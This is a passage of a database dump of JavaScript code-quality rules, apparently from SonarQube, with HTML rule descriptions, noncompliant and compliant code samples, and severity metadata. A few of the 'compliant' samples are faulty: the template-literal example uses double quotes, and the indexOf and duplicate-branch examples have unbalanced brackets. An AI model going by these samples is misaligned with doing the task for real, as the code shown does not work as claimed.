break;\n  ...\n}\n</pre>\n<p>Case 2</p>\n<pre>\nswitch (day) {\n  case MONDAY:\n    break;\n  case TUESDAY:\n    compute(args); // put the content of the labelled "for" statement in a dedicated method\n    break;\n\n    /* ... */\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used.</li>\n<li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.</li>\n<li> MISRA C:2012, 16.1 - All switch statements shall be well-formed</li>\n</ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	misra,pitfall	f	HTML	1511453807463	1511453807464	1
849	Octal values should not be used	OctalNumber	\N	javascript	<p>\nInteger literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar myNumber = 010;   // myNumber will hold 8, not 10 - was this really expected?\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar myNumber = 8;\n</pre>\n\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 7.1 - Octal constants shall not be used</li>\n<li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than "\\0") shall not be used</li>\n<li> MISRA C:2012, 7.1 - Octal constants shall not be used</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/_QC7AQ">CERT DCL18-C</a> - Do not begin integer constants with 0 when specifying a decimal value</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,misra,pitfall	f	HTML	1511453807464	1511453807464	1
850	Unchanged variables should be marked "const"	S3353	\N	javascript	<p>Marking a variable that is unchanged after initialization <code>const</code> is an indication to future maintainers that "no this isn't updated, and it's not supposed to be".\n  <code>const</code> should be used in these situations in the interests of code clarity.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction seek(input) {\n  let target = 32;  // Noncompliant\n  for (let i of input) {\n    if (i == target) {\n      return true;\n    }\n  }\n  return false;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction seek(input) {\n  const target = 32;\n  for (let i of input) {\n    if (i == target) {\n      return true;\n    }\n  }\n  return false;\n}\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	es2015	f	HTML	1511453807465	1511453807465	1
851	Copyright and license headers should be defined	S1451	\N	javascript	<p>\n    Each source file should start with a header stating file ownership and the license which must be used to distribute the application.\n</p>\n<p>\n    This rule must be fed with the header text that is expected at the beginning of every file.\n</p>\n\n<h2>Compliant Solution</h2>\n<pre>\n/*\n * SonarQube, open source software quality management tool.\n * Copyright (C) 2008-2013 SonarSource\n * mailto:contact AT sonarsource DOT com\n *\n * SonarQube is free software; you can redistribute it and/or\n * modify it under the terms of the GNU Lesser General Public\n * License as published by the Free Software Foundation; either\n * version 3 of the License, or (at your option) any later version.\n *\n * SonarQube is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with this program; if not, write to the Free Software Foundation,\n * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n */\n</pre>	4	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807466	1511453807467	1
852	Function declarations should not be made within blocks	FunctionDeclarationsWithinBlocks	\N	javascript	<p>\n  While most script engines support function declarations within blocks, it is not part of ECMAScript 5 and below, and from browser to browser the implementations are inconsistent with each other. ECMAScript 5 and below only allows function declarations in the root statement list of a script or function. If you are targeting browsers that don't support ECMAScript 6, use a variable initialized with a function expression to define a function within a block :\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x) {\n  function foo() {}\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (x) {\n  var foo = function() {}\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cross-browser,user-experience	f	HTML	1511453807467	1511453807468	1
853	Variables should not be shadowed	VariableShadowing	\N	javascript	<p>\n  Overriding a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of code. Further, it could lead maintainers to introduce bugs because they think they're using one variable but are really using another.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nshow: function(point, element) {\n  if (!this.drops.length) return;\n  var drop, affected = [];\n  this.drops.each( function(drop) {  // Non-Compliant; defines a new 'drop' parameter\n    if(Droppables.isAffected(point, element, drop))\n      affected.push(drop);\n  });\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nshow: function(point, element) {\n  if (!this.drops.length) return;\n  var drop, affected = [];\n  this.drops.each( function(aDrop) {\n    if(Droppables.isAffected(point, element, aDrop))\n      affected.push(aDrop);\n  });\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453807468	1511453807468	1
854	"arguments" should not be accessed directly	S3513	\N	javascript	<p>The magic of JavaScript is that you can pass arguments to functions that don't declare parameters, and on the other side, you can use those passed-in arguments inside the no-args <code>function</code>. </p>\n<p>But just because you can, that does't mean you should. The expectation and use of arguments inside functions that don't explicitly declare them is confusing to callers. No one should ever have to read and fully understand a function to be able to use it competently. </p>\n<p>If you don't want to name arguments explicitly, use the <code>...</code> syntax to specify that an a variable number of arguments is expected. Then inside the function, you'll be dealing with a first-class array, rather than an array-like structure.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction concatenate() {\n  let args = Array.prototype.slice.call(arguments);  // Noncompliant\n  return args.join(', ');\n}\n\nfunction doSomething(isTrue) {\n  var args = Array.prototype.slice.call(arguments, 1); // Noncompliant\n  if (!isTrue) {\n    for (var arg of args) {\n      ...\n    }\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction concatenate(...args) {\n  return args.join(', ');\n}\n\nfunction doSomething(isTrue, ...values) {\n  if (!isTrue) {\n    for (var value of values) {\n      ...\n    }\n  }\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	api-design,es2015	f	HTML	1511453807469	1511453807469	1
855	Built-in objects should not be overridden	S2424	\N	javascript	<p>\n  Overriding an object changes its behavior and could potentially impact all code using that object. Overriding standard, built-in objects could therefore have broad,\n  catastrophic effects on previously-working code.\n</p>\n\n<p>This rule detects overrides of the following native objects:</p>\n\n<ul>\n  <li>Fundamental objects - Object, Function, Boolean, Symbol, Error, EvalError, InternalError, RangeError, ReferenceError, SyntaxError, TypeError, URIError</li>\n  <li>Numbers and dates - Number, Math, Date</li>\n  <li>Text processing - String, RegExp</li>\n  <li>Indexed collections - Array, Int8Array, Uint8Array, Uint8ClampedArray, Int16Array, Unit16Array, Int32Array, Uint32Array, Float32Array, Float64Array</li>\n  <li>Keyed collections - Map, Set, WeakMap, WeakSet</li>\n  <li>Structured data - ArrayBuffer, DataView, JSON</li>\n  <li>Control abstraction objects - Promise</li>\n  <li>Reflection - Reflect, Proxy</li>\n  <li>Internationalization - Intl</li>\n  <li>Non-standard objects - Generator, Iterator, ParallelArray, StopIteration</li>\n</ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	confusing	f	HTML	1511453807470	1511453807470	2
856	Debugger statements should not be used	DebuggerStatement	\N	javascript	<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to attacks in production.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfor (i = 1; i&lt;5; i++) {\n  // Print i to the Output window.\n  Debug.write("loop index is " + i);\n  // Wait for user to resume.\n  debugger;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nfor (i = 1; i&lt;5; i++) {\n  // Print i to the Output window.\n  Debug.write("loop index is " + i);\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code</li>\n</ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe,user-experience	f	HTML	1511453807471	1511453807471	3
882	Shorthand object properties should be grouped at the beginning or end of an object declaration	S3499	\N	javascript	<p>Grouping all the shorthand declarations together in an object makes the declaration as a whole more readable. This rule accepts shorthand declarations grouped at either the beginning or end of an object.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nlet obj1 = {\n  foo,\n  a: 1,\n  color,  // Noncompliant\n  b: 2,\n  judyGarland  // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nlet obj1 = {\n  foo,\n  color,\n  judyGarland,\n  a: 1,\n  b: 2\n}\n</pre>\n<p>or </p>\n<pre>\nlet obj1 = {\n  a: 1,\n  b: 2,\n  foo,\n  color,\n  judyGarland\n}\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention,es2015	f	HTML	1511453807495	1511453807496	1
857	Short-circuit logic should be used to prevent null pointer dereferences in conditionals	S1697	\N	javascript	When either the equality operator in a test for <code>null</code> or <code>undefined</code>, or the logical operator that follows it is reversed, the code has the appearance of safely null-testing the object before dereferencing it. Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced only if it is <code>null</code>/<code>undefined</code>, leading to a guaranteed <code>TypeError</code>.\n\n<h2>Noncompliant Code Sample</h2>\n<pre>\nif (str == null &amp;&amp; str.length == 0) {\n  console.log("String is empty");\n}\n\nif (str == undefined &amp;&amp; str.length == 0) {\n  console.log("String is empty");\n}\n\nif (str != null || str.length > 0) {\n  console.log("String is not empty");\n}\n\nif (str != undefined || str.length > 0) {\n  console.log("String is not empty");\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (str != null &amp;&amp; str.length == 0) {\n  console.log("String is empty");\n}\n\nif (str != undefined &amp;&amp; str.length == 0) {\n  console.log("String is empty");\n}\n\nif (str == null || str.length > 0) {\n  console.log("String is not empty");\n}\n\nif (str == undefined || str.length > 0) {\n  console.log("String is not empty");\n}\n</pre>	4	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	\N	f	HTML	1511453807471	1511453807471	2
858	Template strings should be used instead of concatenation	S3512	\N	javascript	<p>ECMAScript 2015 added the ability to use template literals instead of concatenation. Since their use is clearer and more concise, they are preferred in environments that support ECMAScript 2015.</p>\n<p>This rule raises an issue when a string is created from the result of two or more concatenations.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction sayHello(name) {\n  console.log("hello " + name);  // ignored\n}\n\nfunction madLib(verb, noun) {\n  console.log("I really " + verb + " one or two " + noun);  // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction sayHello(name) {\n  console.log("hello ${name}");  // no issue raised before, but this is better\n}\n\nfunction madLib(verb, noun) {\n  console.log("I really ${verb} one or two ${noun}");\n}\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy,es2015	f	HTML	1511453807472	1511453807473	1
859	Tabulation characters should not be used	TabCharacter	\N	javascript	<p>\nDevelopers should not need to configure the tab width of their text editors in order to be able to read source code. So the use of tabulation character must be banned.\n</p>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453807473	1511453807473	1
860	Function names should comply with a naming convention	S100	\N	javascript	<p>\n  Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all function names match a provided regular expression.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction DoSomething(){...}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction doSomething(){...}\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453807474	1511453807474	1
861	Single quotes should be used for string literals	SingleQuote	\N	javascript	<p>\n  For consistency single-quotes (') are preferred to double-quotes (").\n  This is helpful when creating strings that include HTML.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar firstParameter = "something";\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar firstParameter = 'something';\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807475	1511453807475	1
862	"indexOf" checks should not be for positive numbers	S2692	\N	javascript	<p>\n  Most checks against an <code>indexOf</code> call against a string or array compare it with -1 because 0 is a valid index. Any checks which look for values >0 ignore the first element, which is likely a bug.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar color = "blue";\nvar name = "ishmael";\nvar number = 123;\n\nvar arr = [color, name];\n\nif (arr.indexOf("blue") > 0) { // Noncompliant\n  // ...\n}\nif (arr[0].indexOf("ish") > 0 { // Noncompliant\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar color = "blue";\nvar name = "ishmael";\nvar number = 123;\n\nvar arr = [color, name];\n\nif (arr.indexOf("blue") >= 0) {\n  // ...\n}\nif (arr[0].indexOf("ish") > -1 {\n  // ...\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	\N	f	HTML	1511453807476	1511453807476	2
863	Unused function parameters should be removed	UnusedFunctionArgument	\N	javascript	<p>\n  Unused parameters are misleading. Whatever the value passed to such parameters is, the behavior will be the same.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction doSomething(a, b) { // "a" is unused\n  return compute(b);\n}\n</pre>\n\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction doSomething(b) {\n  return compute(b);\n}\n</pre>\n\n\n\n<h2>Exceptions</h2>\n<p>\n  When writing function callbacks, some arguments might be required as part of the function signature, but not actually needed by the callback code.\n  For instance, JQuery has the 'each' helper to iterate over arrays or objects, but using the counter 'i' should remain optional:\n</p>\n<pre>\n$(["first", "last"]).each(function (i, value) {\n  computeSomethingWithValue(value);\n});\n</pre>\n<p>\n  So only unused arguments listed at the end of the argument list will be flagged with issues because they could be omitted from the function signature.\n  Unused arguments which are followed by an argument that _is_ used will be ignored.\n</p>\n<p>\n  Examples :\n</p>\n<pre>\nvar myFirsCallBackFunction = function (p1, p2, p3, p4) {  //unused p2 is not reported but p4 is\n                                              return p1 + p3; }\n\nvar mySecondCallBackFunction = function (p1, p2, p3, p4) {  //unused p1, p2 and p3 are not reported\n                                              return p4; }\n\nvar myThirdCallBackFunction = function (p1, p2, p3, p4) {  //unused p1 is not reported but p3 and p4 are\n                                              return p2; }\n</pre>\n<p>\n  Further, when <code>arguments</code> is used in the function body, no parameter is reported as unused.\n</p>\n<pre>\nfunction doSomething(a, b, c) {\n  compute(arguments);\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n<li> MISRA C++:2008, 0-1-11</li>\n<li> MISRA C:2012, 2.7</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra,unused	f	HTML	1511453807477	1511453807477	1
864	Code should not be dynamically injected and executed to prevent Eval Injection vulnerability	Eval	\N	javascript	<p>The <code>eval</code> function is a way to run arbitrary code at run-time. Generally it is considered to be very dangerous because it allows execution of arbitrary code. Its use is thus discouraged. If you have carefully verified that there is no other option than to use this construct, pay special attention not to pass any user-provided data into it without properly validating it beforehand.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\neval(code_to_be_dynamically_executed)\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/95.html">MITRE CWE-95</a> - CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)">OWASP Top Ten 2013 Category A3</a> - Cross-Site Scripting (XSS)</li>\n</ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cwe,owasp-a3	f	HTML	1511453807478	1511453807478	3
865	Literal boolean values should not be used in condition expressions	S1125	\N	javascript	<p>\n  Remove literal boolean values from conditional expressions to improve readability. Anything that can be tested for equality with a boolean value must itself be a boolean value, and boolean values can be tested atomically.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (booleanVariable == true) { /* ... */ }\nif (booleanVariable != true) { /* ... */ }\nif (booleanVariable || false) { /* ... */ }\ndoSomething(!false);\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (booleanVariable) { /* ... */ }\nif (!booleanVariable) { /* ... */ }\nif (booleanVariable) { /* ... */ }\ndoSomething(true);\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n  The use of literal booleans in comparisons which use identity operators (<code>===</code> and <code>!==</code>) are ignored.\n</p>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453807478	1511453807479	1
867	Identical expressions should not be used on both sides of a binary operator	S1764	\N	javascript	<p>\n  Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical operators, having the same value on both sides of an operator yields predictable results, and should be simplified.\n</p>\n\n<p>\nThis rule ignores <code>*</code>, <code>+</code>, and <code>=</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ( a == a ) { // always true\n  doZ();\n}\nif ( a != a ) { // always false\n  doY();\n}\nif ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too\n  doX();\n}\nif ( a == b || a == b ) { // if the first one is true, the second one is too\n  doW();\n}\n\nvar j = 5 / 5; //always 1\nvar k = 5 - 5; //always 0\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\ndoZ();\n\nif ( a == b ) {\n  doX();\n}\nif ( a == b ) {\n  doW();\n}\n\nvar j = 1;\nvar k = 0;\n</pre>\n\n<h2>Exceptions</h2>\n<p>The specific case of testing one variable against itself is a valid test for <code>NaN</code> and is therefore ignored.</p>\n<p>Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored.</p>\n<pre>\nif(f !== f) { // test for NaN value\n  console.log("f is NaN");\n}\n\nvar i = 1 &lt;&lt; 1; // Compliant\nvar j = a &lt;&lt; a; // Noncompliant\n</pre>\n\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n<li> Rule {rule:javascript:S1656} - Implements a check on <code>=</code>. </li>\n</ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert	f	HTML	1511453807480	1511453807481	2
868	Return of boolean expressions should not be wrapped into an "if-then-else" statement	S1126	\N	javascript	<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (expression) {  \n  return true;\n} else {\n  return false;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nreturn expression; \n</pre>\n<pre>\nreturn !!expression;\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453807481	1511453807481	1
869	"for...in" loops should filter properties before acting on them	ForIn	\N	javascript	<p>The <code>for...in</code> in statement allows you to loop through the names of all of the properties of an object. Unfortunately, the list of properties includes all those properties that were inherited through the prototype chain. This has the bad side effect of serving up method functions when the interest is in data properties. Programs that don't take this into account can fail.</p>\n<p>Therefore, the body of every <code>for...in</code> statement should be wrapped in an <code>if</code> statement that filters which properties are acted upon. It can select for a particular type or range of values, or it can exclude functions, or it can exclude properties from the prototype. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfor (name in object) {\n    doSomething(name);  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nfor (name in object) {\n  if (object.hasOwnProperty(name)) {\n    doSomething(name);\n  }\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807482	1511453807482	2
870	"future reserved words" should not be used as identifiers	FutureReservedWords	\N	javascript	<p>The following words may be used as keywords in future evolutions of the language, so using them as identifiers should be avoided to allow an easier adoption of those potential future versions:</p>\n<ul>\n<li> <code>await</code></li>\n<li> <code>class</code></li>\n<li> <code>const</code></li>\n<li> <code>enum</code></li>\n<li> <code>exports</code></li>\n<li> <code>extends</code></li>\n<li> <code>implements</code></li>\n<li> <code>import</code></li>\n<li> <code>interface</code></li>\n<li> <code>let</code></li>\n<li> <code>package</code></li>\n<li> <code>private</code></li>\n<li> <code>protected</code></li>\n<li> <code>public</code></li>\n<li> <code>static</code></li>\n<li> <code>super</code></li>\n<li> <code>yield</code></li>\n</ul>\n<p>Use of these words as identifiers would produce an error in JavaScript <code>strict</code> mode code.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar package = document.getElementsByName("foo"); // Noncompliant\nvar someData = { package: true };                 // Compliant, as it is not used as an identifier here\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nvar elements = document.getElementsByName("foo"); // Compliant\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	lock-in,pitfall	f	HTML	1511453807483	1511453807484	1
871	Assignments should not be made from within sub-expressions	AssignmentWithinCondition	\N	javascript	<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable.</p>\n<p>It is also a common mistake to write <code>=</code> when <code>==</code> was meant.</p>\n<p>Ideally, expressions should not have side-effects.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\ndoSomething(i = 42);\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\ni = 42;\ndoSomething(i);   \n// or\ndoSomething(i == 42);  // Perhaps in fact the comparison operator was expected\n</pre>\n<h2>Exceptions</h2>\n<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are allowed.</p>\n<pre>\nwhile ((line = nextLine()) != null) {...}  // Compliant\n\nwhile (line = nextLine()) {...}  // Compliant\n\nif (line = nextLine()) {...}  // Noncompliant\n</pre><h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value</li>\n<li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions</li>\n<li> MISRA C:2012, 13.4 - The result of of an assignment operator should not be used</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe,misra	f	HTML	1511453807484	1511453807485	2
872	Function argument names should be unique	DuplicateFunctionArgument	\N	javascript	<p>Function arguments should all have different names to prevent any ambiguity. Indeed, if arguments have the same name, the last duplicated argument hides all the previous arguments with the same name. This hiding makes no sense, reduces understandability and maintainability, and obviously can be error prone. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfunction compute(a, a, c) { // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nfunction compute(a, b, c) { // Compliant\n}\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807485	1511453807486	1
875	Function call arguments should not start on new line	S1472	\N	javascript	<p>Because semicolons at the ends of statements are optional, starting function call arguments on a separate line makes the code confusing. It could lead to errors and most likely <em>will</em> lead to questions for maintainers.</p>\n<p>What was the initial purpose of the developer ?</p>\n<ol>\n<li> Was it to define a function and then to execute some unrelated code inside a closure ?</li>\n<li> Or to pass the second function as a parameter to the first one ?</li>\n</ol>\n<p>The first option will be the one chosen by the JavaScript interpreter..</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar fn = function () {\n  //...\n}\n\n(function () { // Noncompliant\n  //...\n})();\n</pre>\n<h2>Compliant Solution</h2>\n\n<p>Either</p>\n<pre>\n// define a function\nvar fn = function () {\n  //...\n}; // &lt;-- semicolon added\n\n// then execute some code inside a closure\n(function () {\n  //...\n})();\n</pre>\n<p>Or </p>\n<pre>\nvar fn = function () {\n  //...\n}(function () { // &lt;-- start function call arguments on same line\n  //...\n})();\n</pre>\n<p>By extension and to improve readability, any kind of function call arguments should not start on new line.</p>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807488	1511453807489	1
876	Multiline blocks should be enclosed in curly braces	S2681	\N	javascript	<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be misleading and induce bugs. </p>\n<p>This rule raises an issue when the indentation of the lines after a one-line block indicates an intent to include those lines in the block, but the omission of curly braces means the lines will be unconditionally executed once.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (condition)\n  firstActionInBlock();\n  secondAction();  // Noncompliant; executed unconditionally\nthirdAction();\n\nString str = null;\nfor (int i = 0; i &lt; array.length; i++) \n  str = array[i];\n  doTheThing(str);  // Noncompliant; executed only on last array element\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (condition) {\n  firstActionInBlock();\n  secondAction();\n}\nthirdAction();\n\nString str = null;\nfor (int i = 0; i &lt; array.length; i++) {\n  str = array[i];\n  doTheThing(str);\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation\n</li></ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe	f	HTML	1511453807490	1511453807490	2
877	Generators should "yield" something	S3531	\N	javascript	<p>A generator without a <code>yield</code> statement is at best confusing, and at worst a bug in your code, since the iterator produced by your code will always be empty. </p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction* myGen(a, b) {  // Noncompliant\n  let answer = 0;\n  answer += a * b;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction* myGen(a, b) {\n  let answer = 0;\n  while (answer &lt; 42) {\n    answer += a * b;\n    yield answer;\n  }\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	es2015,suspicious	f	HTML	1511453807490	1511453807491	1
878	Object literal shorthand syntax should be used	S3498	\N	javascript	<p>When an already-defined variable is given the same name within a new object, object-shorthand syntax is preferred as being more compact. Similarly, object-shorthand is also preferred for the definition of functions in object literals.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nlet a = 1;\n\nlet myObj = {\n  a : a,  // Noncompliant\n  fun: function () {  // Noncompliant\n    //...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nlet a = 1;\n\nlet myObj = {\n  a,\n  fun () {\n    //...\n  }\n}\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention,es2015	f	HTML	1511453807491	1511453807491	1
879	Two branches in the same conditional structure should not have exactly the same implementation	S1871	\N	javascript	<p>\nHaving two <code>cases</code> in the same <code>switch</code> statement or branches in the same <code>if</code> structure  with the same implementation is at best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then they should be combined, for an <code>if</code> structure or one should fall through to the other for a <code>switch</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (i) {\n  case 1:\n    doSomething();\n    break;\n  case 2:\n    doSomethingDifferent();\n    break;\n  case 3:  // Noncompliant; duplicates case 1's implementation\n    doSomething();\n    break;\n  default:\n    doTheRest();\n}\n\nif (a >= 0 && a < 10) {\n  doTheThing();\nelse if (a >= 10 && a < 20) {\n  doTheOtherThing();\n}\nelse if (a >= 20 && a < 50) {\n  doTheThing();  // Noncompliant; duplicates first condition\n}\nelse {\n  doTheRest();\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nswitch (i) {\n  case 1:\n  case 3:\n    doSomething();\n    break;\n  case 2:\n    doSomethingDifferent();\n    break;\n  default:\n    doTheRest();\n}\n\nif ((a >= 0 && a < 10) || (a >= 20 && a < 50)) {\n  doTheThing();\nelse if (a >= 10 && a < 20) {\n  doTheOtherThing();\n}\nelse {\n  doTheRest();\n}\n</pre>\n\n<p>or</p>\n\n<pre>\nswitch (i) {\n  case 1:\n    doSomething();\n    break;\n  case 2:\n    doSomethingDifferent();\n    break;\n  case 3:\n    doThirdThing();\n    break;\n  default:\n    doTheRest();\n}\n\nif (a >= 0 && a < 10) {\n  